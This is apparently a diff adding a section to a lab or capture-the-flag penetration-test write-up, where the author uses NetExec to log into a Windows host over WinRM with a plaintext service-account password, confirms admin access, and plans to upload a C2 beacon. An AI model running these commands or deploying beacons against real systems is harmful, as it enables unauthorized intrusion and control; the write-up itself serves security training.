@@ -213,3 +213,14 @@ SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webp
 ```
 The output is giving me a `(Pwn3d!)` indicated which tells me this user is an admin!
 
+```python
+nxc winrm web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
+WINRM       10.10.10.132    5985   EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:ext.darkhaven.local) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.10.132    5985   EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
+```
+They also have acces via winrm
+
+This means i can now generate a beacon for my web listener and upload it via winrm to get a C2 session
+
